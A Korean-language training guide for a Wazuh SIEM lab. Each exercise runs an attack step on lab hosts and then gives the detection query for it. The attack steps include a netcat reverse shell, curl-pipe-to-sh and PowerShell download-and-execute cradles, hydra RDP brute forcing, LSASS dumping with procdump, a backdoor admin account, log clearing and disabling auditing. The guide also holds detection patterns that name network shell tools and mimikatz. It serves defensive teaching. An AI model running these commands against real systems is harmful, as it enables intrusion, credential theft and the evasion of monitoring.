### 25. 리버스 셸·네트워크 도구 실행 (auditd)

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
nc -lvnp 4444
ssh ccc@192.168.0.189 "mkfifo /tmp/.f; cat /tmp/.f | bash -i 2>&1 | nc 192.168.0.202 4444 > /tmp/.f"      # 비밀번호는 강사 안내
(nc 화면)
sudo journalctl -t sysmon --since '-3 min' | grep CommandLine | grep nc
```
- **구문 풀이**
  - `nc -lvnp 4444` — [공격자] 4444 포트에서 연결 대기 (-l 듣기, -v 자세히, -n 이름 조회 안 함, -p 포트)
  - `mkfifo /tmp/.f; cat /tmp/.f | bash -i 2>&1 | nc 공격자 4444 > /tmp/.f` — [피해 서버] 이름 있는 파이프로 bash 입출력을 nc 연결에 이어 붙인다 → 공격자 화면에서 피해 서버 셸을 조작
- **DQL**
```
rule.groups:audit_command AND (data.audit.exe:(*/nc or */nc.openbsd or */ncat or */socat or */telnet) OR data.audit.execve.a1:*/dev/tcp/* OR data.audit.execve.a2:*/dev/tcp/* OR data.audit.execve.a0:(nc or ncat or socat))
```
- **원본과 달라진 점**: 원본 DQL 의 data.audit.exe:(*/nc …) 는 Ubuntu 의 nc 실체 /usr/bin/nc.openbsd 를 못 잡음 → */nc.openbsd 추가. auditd 는 kt66-host 에 설치(원본은 '없음·대체')
  - 원본 DQL: `rule.groups:audit_command AND (data.audit.exe:(*/nc or */ncat or */socat or */telnet) OR data.audit.execve.a1:*/dev/tcp/* OR data.audit.execve.a2:*/dev/tcp/* OR data.audit.execve.a0:(nc or ncat or socat))`
- **읽는 법**
  - rule.groups:audit_command = auditd 가 기록한 '명령 실행(execve)'. data.audit.exe 가 /usr/bin/nc.openbsd
  - data.audit.execve.a0~a2 에 명령과 인자(nc 192.168.0.202 4444), data.audit.auid 1000 = 로그인한 원래 사용자(ccc)
  - 함정: bash -i >& /dev/tcp/… 처럼 공백 든 인자는 auditd 가 16진수로 기록해 Wazuh 가 a2 를 못 풀어 낸다

### 26. 다운로드 후 실행 (curl/wget 파이프)

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
python3 -m http.server 8000   # ~/lab/www/a.sh 서빙
ssh ccc@192.168.0.189 'curl -s http://192.168.0.202:8000/a.sh | sh'
```
- **구문 풀이**
  - `python3 -m http.server 8000` — [공격자] 현재 폴더를 웹으로 공개 — a.sh 를 내려받게 한다
  - `curl -s http://…/a.sh | sh` — [피해 서버] 받은 내용을 파일로 저장하지 않고 곧바로 sh 로 실행 (디스크에 흔적이 덜 남는다)
- **DQL**
```
rule.groups:audit_command AND data.audit.execve.a0:(curl or wget) AND (data.audit.execve.a1:*http* or data.audit.execve.a2:*http*)
```
- **원본과 달라진 점**: auditd 를 kt66-host 에 설치해 원본 그대로 동작 (원본은 '명령 로그로 대체')
- **읽는 법**
  - data.audit.execve.a0:curl 과 a1/a2 의 http 주소
  - 같은 auid·같은 1~2초 안에 a0:sh 실행이 이어지면 파이프 실행

### 27. 시스템 바이너리 변조 (백도어)

- **결과**: 2 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
sudo docker exec -it kt66-web bash   # web 서버 셸
root@web:/# sha256sum /usr/bin/yes; printf '\x00KT66' >> /usr/bin/yes; sha256sum /usr/bin/yes
root@web:/# cp /root/yes.orig /usr/bin/yes    # 원복
```
- **구문 풀이**
  - `printf '\x00KT66' >> /usr/bin/yes` — 시스템 프로그램 끝에 바이트를 덧붙여 '트로이 목마로 바꿔치기'를 흉내 → 해시가 달라진다
  - `cp /root/yes.orig /usr/bin/yes` — 실습 뒤 원복 (이 변경도 550 으로 남는다)
- **DQL**
```
rule.id:550 AND syscheck.path:(/bin/* or /sbin/* or /usr/bin/* or /usr/sbin/* or /lib/* or /usr/lib/*)
```
- **원본과 달라진 점**: kt66 보강: /usr/bin·/usr/sbin 실시간 감시 추가 (원본은 12시간 주기라 '지연')
- **읽는 법**
  - 550 + syscheck.path:/usr/bin/… — sha256_before 와 sha256_after 가 다르다
  - 패키지 원본 해시(debsums, rpm -V)와 비교. 업데이트 시각과 안 맞으면 백도어 의심

### 28. 로그 삭제·변조

- **결과**: 2 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
ssh -p 2204 ccc@192.168.0.189 '> ~/.bash_history; sudo rm /var/log/btmp'
```
- **구문 풀이**
  - `> ~/.bash_history` — 명령 기록 파일 비우기 — 파일은 남고 크기만 0 이 된다 (modified)
  - `sudo rm /var/log/btmp` — 로그인 실패 기록 파일 삭제 (deleted, 553)
- **DQL**
```
(rule.id:553 AND syscheck.path:/var/log/*) OR (syscheck.path:*bash_history* AND syscheck.event:(deleted or modified))
```
- **원본과 달라진 점**: kt66 보강: /var/log 를 생성·삭제만 실시간 감시 (내용 변경은 너무 잦아 제외)
- **읽는 법**
  - 553 + syscheck.path:/var/log/* = 로그 파일 삭제
  - bash_history 의 modified/deleted. 직전 같은 서버의 로그인(5715)·sudo(5402)를 보면 누가 지웠는지 특정

### 29. 새 리스닝 포트 (명령 모니터링)

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
ssh ccc@192.168.0.189 'nc -lk 31337 &; ss -ltnp | grep 31337'
```
- **구문 풀이**
  - `nc -lk 31337 &` — [피해 서버] 31337 포트를 계속(-k) 열어 두는 백도어 흉내 (& = 백그라운드)
- **DQL**
```
rule.id:533
```
- **원본과 달라진 점**: kt66-host 에 net-tools(netstat) 설치 — 원본은 '확인 필요'
- **읽는 법**
  - 533 = 에이전트가 6분마다 netstat 결과를 비교해 '새로 열린/닫힌 포트'를 알림
  - full_log 에 바뀐 포트 목록. 같은 포트를 osquery(62번)도 1분 주기로 찾는다

### 30. 방화벽 드롭 다발 (포트 스캔)

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
nmap -sT -Pn -p 1-1000 --max-retries 1 192.168.0.189 2>&1 | grep -vE '^$|^Starting'
```
- **구문 풀이**
  - `nmap -sT -Pn -p 1-1000 --max-retries 1 192.168.0.189` — -sT TCP 연결 스캔, -Pn 핑 생략, 1~1000번 포트, 재시도 1회
- **DQL**
```
rule.id:4151 OR (rule.groups:firewall_drop AND data.srcip:*)
```
- **원본과 달라진 점**: 원본은 '대체(IPS 룰)'. kt66-host 경계 방화벽 + kern.log 수집으로 원본 룰 그대로 동작 (Wazuh journald 수집기는 커널 메시지를 가져오지 않아 kern.log 를 따로 읽는다)
- **읽는 법**
  - kt66 호스트의 경계 방화벽이 닫힌 포트로 온 SYN 을 DROP 하고 커널 로그('DROP IN=… SRC=… DPT=…')로 남긴다
  - 4151 = 같은 IP 의 차단이 45초에 18번 이상 — 개별 차단(4101)은 기본 룰이 no_log 라 인덱스에 안 남는다

### 58. Active Response 발동 이력

- **결과**: 2 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
ssh -p 2204 ccc@192.168.0.189
sudo docker exec kt66-bastion iptables -S | grep 192.168.0.202
sudo docker exec kt66-bastion tail -2 /var/ossec/logs/active-responses.log
```
- **구문 풀이**
  - `(17번 직후) ssh -p 2204 ccc@192.168.0.189` — 브루트포스(5712)가 뜨자 매니저가 bastion 에 firewall-drop 을 지시 → 공격자 연결이 '시간 초과'
  - `iptables -S | grep 192.168.0.202` — bastion 안에 공격자 IP 를 막는 DROP 규칙이 생겼다 (180초 뒤 자동 해제)
- **DQL**
```
rule.id:(651 or 652) OR rule.groups:active_response
```
- **원본과 달라진 점**: kt66 보강: 매니저에 Active Response 설정(5712·5763 → firewall-drop 180초), bastion 에 에이전트·iptables 추가
- **읽는 법**
  - 651 = 차단 실행, 652 = 차단 해제 (active-responses.log)
  - data.srcip 로 차단된 IP 확인 — 정상 IP 가 있으면 화이트리스트에 추가

## Windows / Sysmon (31~50)

### 31. 로그온 실패 브루트포스 (4625)

- **결과**: 10 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
hydra -l victim -P /tmp/pw.txt -t 1 rdp://10.20.70.10
```
- **구문 풀이**
  - `ssh -p 2202 ccc@192.168.0.189` — 공격자 VM 에서 kt66 내부 공격 컨테이너(10.20.30.202)로 들어간다 — Windows 로 가는 RDP(3389) 경로는 여기만 열려 있다
  - `hydra -l victim -P /tmp/pw.txt -t 1 rdp://10.20.70.10` — 실습용 계정 victim 에 암호 사전 대입. RDP 는 동시 연결에 약해 -t 1
- **DQL**
```
data.win.system.eventID:4625 AND data.win.eventdata.subStatus:(0xc000006a or 0xc0000064)
```
- **읽는 법**
  - 4625 = 로그온 실패. subStatus 0xc000006a 잘못된 암호, 0xc0000064 없는 계정, 0xc0000234 잠긴 계정
  - logonType 3 = 네트워크(NLA 를 쓰는 RDP 인증 단계도 3), 10 = 원격 대화형(RDP 세션)
  - ipAddress 가 공격 출발지 (kt66 내부 공격 컨테이너 10.20.30.202)

### 32. 계정 열거 (없는 계정으로 실패)

- **결과**: 3 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
ssh -p 2202 ccc@192.168.0.189    # 비밀번호 ccc
ccc@attacker:~$ printf 'administrator\nadmin\ntest\nbackup\nguest\n' > /tmp/users.txt
hydra -L /tmp/users.txt -p Winter2026 -t 1 rdp://10.20.70.10
```
- **구문 풀이**
  - `hydra -L /tmp/users.txt -p Winter2026 rdp://10.20.70.10` — 흔한 계정명 목록에 고정 암호 1개 — 계정 열거
- **DQL**
```
data.win.system.eventID:4625 AND data.win.eventdata.subStatus:0xc0000064
```
- **읽는 법**
  - subStatus 0xc0000064 만 남기면 '없는 계정' 시도만 남는다
  - targetUserName 을 Visualize → 공격 사전 확인

### 33. 계정 잠금 (4740)

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
net accounts | Select-String '잠금|Lockout'; (Get-LocalUser victim | Select Name,Enabled | Format-List | Out-String).Trim(); Get-CimInstance Win32_UserAccount -Filter "Name='victim'" | Select Name,Lockout | Format-List
```
- **구문 풀이**
  - `net accounts` — 잠금 정책 확인 — 5회 실패 시 1분 잠금(실습용으로 설정)
- **DQL**
```
data.win.system.eventID:4740
```
- **읽는 법**
  - 4740 = 계정 잠김. targetUserName 이 잠긴 계정, subjectUserName·callerComputerName 이 요청 출처
  - 정상 사용자가 잠기면 서비스 거부 효과 — 실습은 관리 계정이 아닌 victim 으로 한다

### 34. 외부에서 RDP 접속 성공 (4624 / 유형 10)

- **결과**: 2 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
xvfb-run -a xfreerdp /v:10.20.70.10 /u:victim /p:'Victim!2026' /cert:ignore
```
- **구문 풀이**
  - `xvfb-run -a xfreerdp /v:10.20.70.10 /u:victim /p:… /cert:ignore` — 실제 원격 데스크톱 세션. 화면 없는 서버라 xvfb-run(가상 화면)으로 실행, /cert:ignore 인증서 경고 무시
- **DQL**
```
data.win.system.eventID:4624 AND data.win.eventdata.logonType:10 AND NOT data.win.eventdata.ipAddress:(127.0.0.1 or "-")
```
- **원본과 달라진 점**: kt66 의 외부 출발지는 10.20.30.202 → 원본의 NOT ipAddress:(10.* …) 는 0건. 사설 대역 제외를 빼고 로컬(127.0.0.1, -)만 제외
  - 원본 DQL: `data.win.system.eventID:4624 AND data.win.eventdata.logonType:10 AND NOT data.win.eventdata.ipAddress:(10.* or 192.168.* or 172.16.* or 127.0.0.1 or "-")`
- **읽는 법**
  - 4624 + logonType 10 = RDP 로 실제 로그온
  - ipAddress·targetUserName·workstationName 으로 누가 어디서 왔는지

### 35. Pass-the-Hash 징후 (NTLM 네트워크 로그온)

- **결과**: 2 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
net use \\127.0.0.1\IPC$ /user:victim Victim!2026
[K.A]::LogonUser('fakeadmin','CORP','x', 9 <#NewCredentials#>, 3 <#WINNT50#>, [ref]$h)
```
- **구문 풀이**
  - `net use \\127.0.0.1\IPC$ /user:victim …` — IP 주소로 공유에 접속하면 Kerberos 대신 NTLM 이 쓰인다 → 4624 유형 3 + NTLM
  - `LogonUser(…, 9 /*NewCredentials*/ …)` — runas /netonly 와 같은 '유형 9' 로그온 — mimikatz 의 Pass-the-Hash(sekurlsa::pth)가 남기는 흔적을 API 로 재현
- **DQL**
```
data.win.system.eventID:4624 AND (data.win.eventdata.logonType:9 OR (data.win.eventdata.logonType:3 AND data.win.eventdata.authenticationPackageName:NTLM)) AND NOT data.win.eventdata.targetUserName:(*$ or ANONYMOUS*)
```
- **읽는 법**
  - logonType 9 + logonProcessName seclogo/Advapi = 새 자격증명으로 외부 접근 준비
  - logonType 3 + authenticationPackageName NTLM = 해시만으로도 가능한 인증 방식

### 36. 명시적 자격증명 로그온 (4648, 횡적 이동)

- **결과**: 1 hits · 인덱스 `wazuh-archives-*`
- **실행한 명령**
```bash
net use \\127.0.0.1\C$ /user:victim Victim!2026
```
- **구문 풀이**
  - `net use \\127.0.0.1\C$ /user:victim …` — 다른 계정 자격증명을 명시해 자원에 접근 → 4648
- **DQL**
```
data.win.system.eventID:4648 AND NOT data.win.eventdata.targetServerName:(localhost or "-")
```
- **원본과 달라진 점**: 인덱스 패턴을 wazuh-archives-* 로 바꿔 검색 (아카이브 활성화 — 따라하기 슬라이드 참고)
- **읽는 법**
  - subjectUserName(지금 로그인한 사람) → targetUserName@targetServerName(쓴 자격증명·대상) 흐름이 횡적 이동 경로
  - Wazuh 4.10 기본 룰셋에는 4648 룰이 없어 레벨 0 → wazuh-alerts 에 안 남고 wazuh-archives 에서만 찾힌다

### 37. 계정 생성·관리자 그룹 추가 (4720/4732/4728)

- **결과**: 3 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
net user backdoor P@ssw0rd!26 /add; net localgroup Administrators backdoor /add
```
- **구문 풀이**
  - `net user backdoor P@ssw0rd!26 /add; net localgroup Administrators backdoor /add` — 백도어 계정을 만들고 관리자 그룹에 넣는다
- **DQL**
```
data.win.system.eventID:(4720 or 4722) OR (data.win.system.eventID:(4732 or 4728) AND data.win.eventdata.targetUserName:(Administrators or "Domain Admins" or "Remote Desktop Users"))
```
- **읽는 법**
  - 4720 사용자 생성 → 4732 로컬 그룹 추가. 같은 수행자(subjectUserName)가 연달아 하면 백도어 생성 흐름
  - 그룹 추가 이벤트에서 그룹 이름은 targetUserName, 추가된 계정은 memberSid

### 38. 감사 로그 삭제 (1102/104)

- **결과**: 2 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
wevtutil cl Security; wevtutil cl System
```
- **구문 풀이**
  - `wevtutil cl Security; wevtutil cl System` — 보안·시스템 이벤트 로그를 통째로 지운다 (cl = clear-log)
- **DQL**
```
data.win.system.eventID:(1102 or 104)
```
- **읽는 법**
  - 1102(Security)·104(System) = 로그 삭제 — 지운 직후 첫 이벤트로 반드시 남는다
  - Wazuh 는 이미 수집해 두었으므로 지우기 전 이벤트도 SIEM 에 그대로 있다

### 39. 서비스 설치 (7045/4697, PsExec 등)

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
sc.exe create evilsvc binPath= "C:\Windows\Temp\x.exe" start= demand
C:\Tools\PsExec64.exe -accepteula -s cmd /c whoami
```
- **구문 풀이**
  - `sc.exe create evilsvc binPath= "C:\Windows\Temp\x.exe"` — Temp 폴더 실행 파일을 서비스로 등록 (binPath= 뒤에 공백 필수)
  - `PsExec64.exe -s cmd /c whoami` — PsExec 은 대상에 PSEXESVC 서비스를 설치해 SYSTEM 으로 명령 실행
- **DQL**
```
data.win.system.eventID:(7045 or 4697) AND (data.win.eventdata.serviceName:(PSEXESVC or *mimi* or *meterpreter* or evilsvc) OR data.win.eventdata.imagePath:(*cmd.exe* or *powershell* or *\\\\Temp\\\\* or *\\\\Users\\\\Public\\\\* or *\\\\AppData\\\\*))
```
- **원본과 달라진 점**: 원본 *\\Temp\\* 는 저장값(C:\\Windows\\Temp\\…)과 안 맞음 → *\\\\Temp\\\\* (역슬래시 두 겹을 각각 이스케이프)
  - 원본 DQL: `data.win.system.eventID:(7045 or 4697) AND (data.win.eventdata.serviceName:(PSEXESVC or *mimi* or *meterpreter*) OR data.win.eventdata.imagePath:(*cmd.exe* or *powershell* or *\\Temp\\* or *\\Users\\Public\\* or *\\AppData\\*))`
- **읽는 법**
  - 7045(System)·4697(Security) = 서비스 설치. serviceName·imagePath 확인
  - Wazuh 는 Windows 경로의 역슬래시를 두 겹(\\)으로 저장한다 → DQL 에서 \\\\ 로 써야 한다

### 40. 스케줄 작업 생성 (4698)

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
schtasks /create /tn kt66evil /tr "powershell -nop -w hidden -c Get-Date" /sc minute /f
```
- **구문 풀이**
  - `schtasks /create /tn kt66evil /tr "powershell -nop -w hidden …" /sc minute` — 1분마다 숨김 PowerShell 을 실행하는 예약 작업 — 지속화
- **DQL**
```
data.win.system.eventID:4698 AND data.win.eventdata.taskContent:(*powershell* or *cmd.exe* or *wscript* or *mshta* or *\\Temp\\* or *http*)
```
- **읽는 법**
  - 4698 = 예약 작업 생성. taskContent(XML) 안의 <Command>·<Arguments> 를 읽는다
  - 감사 정책 '기타 개체 액세스 이벤트'가 켜져 있어야 남는다 (kt66 설치 스크립트가 켬)

### 41. PowerShell 난독화·다운로드 실행 (Sysmon 1)

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
$b=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output kt66-encoded-demo')); powershell -nop -w hidden -enc $b
powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://10.20.32.80/kt66-lab.ps1')"
```
- **구문 풀이**
  - `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(…))` — 명령을 UTF-16LE 로 바꾼 뒤 Base64 로 인코딩
  - `powershell -nop -w hidden -enc <Base64>` — -nop 프로필 안 읽음, -w hidden 창 숨김, -enc 인코딩된 명령 실행 — 명령줄만 봐서는 내용이 안 보인다
  - `IEX (New-Object Net.WebClient).DownloadString('…')` — 웹에서 받은 스크립트를 파일로 저장하지 않고 메모리에서 바로 실행
- **DQL**
```
data.win.system.eventID:1 AND data.win.eventdata.image:*powershell.exe AND data.win.eventdata.commandLine:(*-enc* or *-EncodedCommand* or *DownloadString* or *DownloadFile* or *IEX* or *Invoke-Expression* or *-nop* or *-w hidden* or *bypass* or *FromBase64String*)
```
- **원본과 달라진 점**: 원본 조건 중 *-ec * 처럼 공백이 든 값은 따옴표 없이는 동작하지 않아 제외 (나머지 동일)
  - 원본 DQL: `data.win.system.eventID:1 AND data.win.eventdata.image:*powershell.exe AND data.win.eventdata.commandLine:(*-enc* or *-EncodedCommand* or *-ec * or *DownloadString* or *DownloadFile* or *IEX* or *Invoke-Expression* or *-nop* or *-w hidden* or *-WindowStyle Hidden* or *bypass* or *FromBase64String*)`
- **읽는 법**
  - Sysmon 1 = 프로세스 생성. commandLine 에 -enc·IEX·DownloadString
  - -enc 뒤 문자열을 Base64 디코딩하면 실제 명령이 나온다 (CyberChef 등)
  - parentImage 가 WINWORD·wscript 면 문서 매크로·스크립트 경유

### 42. PowerShell 스크립트 블록 로깅 (4104)

- **결과**: 1 hits · 인덱스 `wazuh-archives-*`
- **실행한 명령**
```bash
powershell -nop -c "$api='VirtualAlloc'; [System.Reflection.Assembly]::GetExecutingAssembly(); 'kt66 demo'"
```
- **구문 풀이**
  - `powershell -c "$api='VirtualAlloc'; [System.Reflection.Assembly]::…"` — 의심 API 이름이 든 스크립트 실행 — 실제 메모리 조작은 하지 않는 안전한 재현
- **DQL**
```
data.win.system.eventID:4104 AND data.win.eventdata.scriptBlockText:(*Invoke-Mimikatz* or *Invoke-Shellcode* or *System.Reflection.Assembly* or *VirtualAlloc* or *SetThreadContext* or *AmsiUtils* or *amsiInitFailed*)
```
- **원본과 달라진 점**: 인덱스 패턴 wazuh-archives-*
- **읽는 법**
  - 4104 = 스크립트 블록 로깅. 난독화를 풀어 실행하는 순간의 실제 코드가 scriptBlockText 에 남는다
  - 기본 룰셋은 이 문자열들에 대한 룰이 없어 레벨 0 → wazuh-archives 에서 검색

### 43. LSASS 접근 (Sysmon 10, 자격증명 덤프)

- **결과**: 7 hits · 인덱스 `wazuh-archives-*`
- **실행한 명령**
```bash
C:\Tools\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\l.dmp
```
- **구문 풀이**
  - `procdump64.exe -accepteula -ma lsass.exe l.dmp` — lsass.exe(로그인 암호 해시를 들고 있는 프로세스) 메모리 전체(-ma)를 파일로 덤프
- **DQL**
```
data.win.system.eventID:10 AND data.win.eventdata.targetImage:*lsass.exe AND NOT data.win.eventdata.sourceImage:(*MsMpEng.exe or *csrss.exe or *wininit.exe or *services.exe or *svchost.exe or *lsass.exe or *osqueryd.exe)
```
- **원본과 달라진 점**: 인덱스 패턴 wazuh-archives-*. Windows 11 은 LSASS 를 보호 프로세스(RunAsPPL)로 띄워 ProcDump 가 접근 거부로 실패하므로 kt66 설치 스크립트가 RunAsPPL 을 끈다(재부팅 후). sourceImage 제외 목록에 osqueryd.exe 추가(osquery 가 주기적으로 lsass 를 조회). kt66 Sysmon 설정은 LSASS 접근을 기록하도록 보강 (SwiftOnSecurity 기본은 미기록)
- **읽는 법**
  - Sysmon 10 = 다른 프로세스 메모리 접근. targetImage lsass.exe, sourceImage procdump64.exe
  - grantedAccess 0x1FFFFF(전체)·0x1010 등이 덤프용 권한
  - Defender 가 켜져 있으면 HackTool:Win32/DumpLsass 로 차단 — 실습은 Defender 를 끈 상태

### 44. 레지스트리 Run 키 지속화 (Sysmon 13)

- **결과**: 2 hits · 인덱스 `wazuh-archives-*`
- **실행한 명령**
```bash
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d C:\Temp\x.exe /f
```
- **구문 풀이**
  - `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d C:\Temp\x.exe` — 로그온할 때마다 실행되는 Run 키에 값 추가 — 지속화
- **DQL**
```
data.win.system.eventID:13 AND data.win.eventdata.targetObject:(*CurrentVersion\\\\Run* or *CurrentVersion\\\\RunOnce* or *Winlogon\\\\Shell* or *Winlogon\\\\Userinit*)
```
- **원본과 달라진 점**: 원본 *CurrentVersion\\Run* → 0건. 저장값의 역슬래시가 두 겹이라 *CurrentVersion\\\\Run* 로 써야 한다. 인덱스 wazuh-archives-*
  - 원본 DQL: `data.win.system.eventID:13 AND data.win.eventdata.targetObject:(*CurrentVersion\\Run* or *CurrentVersion\\RunOnce* or *Winlogon\\Shell* or *Winlogon\\Userinit*)`
- **읽는 법**
  - Sysmon 13 = 레지스트리 값 설정. targetObject 경로, details 에 등록된 실행 파일
  - image 가 reg.exe·powershell 이면 설치 프로그램이 아닌 수동 등록

### 45. LOLBin 악용 (certutil, mshta, regsvr32, rundll32)

- **결과**: 2 hits · 인덱스 `wazuh-archives-*`
- **실행한 명령**
```bash
certutil -f -decode C:\Windows\Temp\p.b64 C:\Windows\Temp\p.bat
certutil -urlcache -split -f https://www.example.com/ C:\Windows\Temp\x.txt
```
- **구문 풀이**
  - `certutil -f -decode p.b64 p.bat` — 인증서 도구 certutil 로 Base64 를 풀어 파일 생성 — 백신이 '정상 프로그램'으로 보는 점을 악용
  - `certutil -urlcache -split -f https://… x.txt` — certutil 로 웹에서 파일 받기 — Defender 가 켜져 있으면 Trojan:Win32/Ceprolad.A 로 즉시 차단
- **DQL**
```
data.win.system.eventID:1 AND data.win.eventdata.image:(*certutil.exe or *mshta.exe or *regsvr32.exe or *rundll32.exe or *bitsadmin.exe or *wmic.exe or *msiexec.exe) AND data.win.eventdata.commandLine:(*http* or *urlcache* or *decode* or *javascript* or *scrobj* or */i\:* or *process call create*)
```
- **원본과 달라진 점**: 원본 DQL 문법 오류: */i:* 의 ':' → */i\:*. 인덱스 wazuh-archives-*
  - 원본 DQL: `data.win.system.eventID:1 AND data.win.eventdata.image:(*certutil.exe or *mshta.exe or *regsvr32.exe or *rundll32.exe or *bitsadmin.exe or *wmic.exe or *msiexec.exe) AND data.win.eventdata.commandLine:(*http* or *urlcache* or *decode* or *javascript* or *scrobj* or */i:* or *process call create*)`
- **읽는 법**
  - Sysmon 1 의 image certutil.exe + commandLine 의 -decode·-urlcache
  - Defender 가 막으면 이 이벤트 대신 49번(1116 Ceprolad)으로 탐지된다

### 46. Office 문서에서 자식 프로세스 생성 (매크로)

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
csc.exe /out:C:\Windows\Temp\WINWORD.EXE w.cs   # cmd /c whoami 를 실행하는 프로그램
PS C:\Users\kt66student> C:\Windows\Temp\WINWORD.EXE
```
- **구문 풀이**
  - `csc.exe /out:WINWORD.EXE w.cs` — Office 가 없어 'WINWORD.EXE' 라는 이름의 작은 프로그램을 만들어 cmd 를 띄우게 함 — 매크로의 부모-자식 관계 재현
- **DQL**
```
data.win.system.eventID:1 AND data.win.eventdata.parentImage:(*WINWORD.EXE or *EXCEL.EXE or *POWERPNT.EXE or *OUTLOOK.EXE) AND data.win.eventdata.image:(*cmd.exe or *powershell.exe or *wscript.exe or *cscript.exe or *mshta.exe or *rundll32.exe or *regsvr32.exe)
```
- **원본과 달라진 점**: Office 미설치 → 모의 WINWORD.EXE (탐지 논리는 프로세스 이름 기준이라 동일)
- **읽는 법**
  - Sysmon 1 의 parentImage *WINWORD.EXE, image cmd.exe
  - 정상 Word 는 cmd·powershell 을 띄우지 않는다

### 47. 수상한 프로세스의 외부 네트워크 연결 (Sysmon 3)

- **결과**: 1 hits · 인덱스 `wazuh-archives-*`
- **실행한 명령**
```bash
1..3 | % { Invoke-WebRequest https://www.example.com -UseBasicParsing; Start-Sleep 2 }
```
- **구문 풀이**
  - `Invoke-WebRequest https://www.example.com (3회, 2초 간격)` — PowerShell 이 직접 외부 웹서버에 접속 — 일정 간격 반복이면 C2 비컨
- **DQL**
```
data.win.system.eventID:3 AND data.win.eventdata.image:(*powershell.exe or *rundll32.exe or *regsvr32.exe or *mshta.exe or *wscript.exe or *certutil.exe) AND NOT data.win.eventdata.destinationIp:(10.* or 192.168.* or 172.16.* or 127.*)
```
- **원본과 달라진 점**: 인덱스 wazuh-archives-*
- **읽는 법**
  - Sysmon 3 = 네트워크 연결. image powershell.exe, destinationIp·destinationPort
  - 같은 목적지로 60초·300초처럼 규칙적이면 비컨

### 48. DNS 질의로 C2·터널링 탐지 (Sysmon 22)

- **결과**: 3 hits · 인덱스 `wazuh-archives-*`
- **실행한 명령**
```bash
Resolve-DnsName kt66lab.ngrok.io; Resolve-DnsName kt66lab.duckdns.org; Resolve-DnsName x.pastebin.com
```
- **구문 풀이**
  - `Resolve-DnsName kt66lab.ngrok.io / kt66lab.duckdns.org / x.pastebin.com` — 터널링·동적 DNS 서비스 도메인 조회 — 응답이 없어도 질의는 기록된다
- **DQL**
```
data.win.system.eventID:22 AND data.win.eventdata.queryName:(*ngrok* or *duckdns* or *pastebin* or *.onion* or *dnslog* or *burpcollaborator* or *interact.sh* or *.tk or *.xyz)
```
- **원본과 달라진 점**: 인덱스 wazuh-archives-*
- **읽는 법**
  - Sysmon 22 = DNS 질의. queryName, 질의한 프로세스 image
  - 브라우저가 아닌 프로세스의 질의면 우선 조사

### 49. Windows Defender 탐지·치료 실패 (1116/1117/1118)

- **결과**: 3 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
Set-Content C:\Windows\Temp\eicar.txt 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
```
- **구문 풀이**
  - `Set-Content eicar.txt 'X5O!P%@AP[4\PZX54…'` — EICAR = 모든 백신이 '테스트용 악성코드'로 탐지하도록 약속된 무해한 문자열
- **DQL**
```
data.win.system.channel:"Microsoft-Windows-Windows Defender/Operational" AND data.win.system.eventID:(1116 or 1117 or 1118 or 1119 or 5001)
```
- **원본과 달라진 점**: Defender 채널 수집을 kt66 설치 스크립트에 추가 (원본은 '있어야 수집')
- **읽는 법**
  - 1116 탐지 → 1117 조치. threatName 에 EICAR_Test_File, Ceprolad(45번), DumpLsass(43번)
  - 5001 = 실시간 보호가 꺼짐 — 공격자가 백신을 끈 흔적이자, 이 실습에서 Defender 를 끈 기록

### 50. 감사 정책 변경·특권 로그온 (4719/4672)

- **결과**: 9 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
auditpol /set /subcategory:"로그온" /success:disable    # 다시 /success:enable
```
- **구문 풀이**
  - `auditpol /set /subcategory:"로그온" /success:disable` — '로그온' 감사를 끈다 → 4719 (실습 뒤 즉시 다시 켬)
- **DQL**
```
data.win.system.eventID:4719 OR (data.win.system.eventID:4672 AND NOT data.win.eventdata.subjectUserName:(SYSTEM or *$ or "LOCAL SERVICE" or "NETWORK SERVICE"))
```
- **읽는 법**
  - 4719 = 감사 정책 변경 — 항상 조사
  - 4672 = 관리자 권한 로그온. privilegeList 의 SeDebugPrivilege 는 LSASS 덤프가 가능한 세션

## 통합 모듈 (51~61) · osquery (62·63)

### 51. 치명적 취약점 보유 호스트

- **결과**: 176 hits · 인덱스 `wazuh-states-vulnerabilities-* (Inventory 화면)`
- **구문 풀이**
  - `메뉴 ☰ → Threat intelligence → Vulnerability Detection → Inventory 탭` — Wazuh 4.8 이후 취약점은 '알림'이 아니라 '현재 상태' 인덱스(wazuh-states-vulnerabilities-*)에 쌓인다
- **DQL**
```
vulnerability.severity:(Critical or High)   (Threat intelligence › Vulnerability Detection › Inventory)
```
